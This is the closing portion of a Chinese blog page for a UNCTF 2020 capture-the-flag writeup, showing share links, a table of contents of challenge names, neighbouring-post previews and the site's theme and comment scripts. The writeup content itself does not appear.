+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/&title=UNCTF 部分writeup - 明月归的小站&summary=记一下"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/&title=UNCTF 部分writeup - 明月归的小站&summary=记一下"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/&title=UNCTF 部分writeup - 明月归的小站&summary=记一下"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/12/05/RoarCTF2020%E9%83%A8%E5%88%86writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>RoarCTF2020部分writeup</p>
+                <p class='content'>ccc 太菜了！！！
+
+
+webezsqlfuzz一下过滤了
+1空格 select union ; if
+
+写脚本bool盲注：
+12345678910111213141516171819202...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/11/02/Hackgame2020%E9%83%A8%E5%88%86writeup/'>
+                <p class='title'>Hackgame2020部分writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>wtcl!打了这麽久ctf感觉还是个萌新！
+
+
+官方writeup:https://github.com/USTC-Hackergame/hackergame2020-writeups
+2048...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-ssrf"><span class="toc-text">easy_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyunserialize"><span class="toc-text">easyunserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyeval"><span class="toc-text">babyeval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyflask"><span class="toc-text">easyflask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-upload"><span class="toc-text">easy_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UN%E2%80%99s-online-tools"><span class="toc-text">UN’s_online_tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezfind"><span class="toc-text">ezfind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#L0vephp"><span class="toc-text">L0vephp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin-sql"><span class="toc-text">checkin-sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-flask2"><span class="toc-text">easy_flask2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-rsa"><span class="toc-text">easy_rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9E%8D%E5%B1%B1%E5%A4%A7%E6%B3%95%E5%AE%98%E5%BC%80%E5%BA%AD%E4%B9%8B%E7%BC%BA%E7%9A%84%E8%90%A5%E5%85%BB%E8%BF%99%E4%B8%80%E5%9D%97%E6%80%8E%E4%B9%88%E8%A1%A5"><span class="toc-text">鞍山大法官开庭之缺的营养这一块怎么补</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RSA"><span class="toc-text">简单的RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wing"><span class="toc-text">wing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-text">简单的备忘录</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
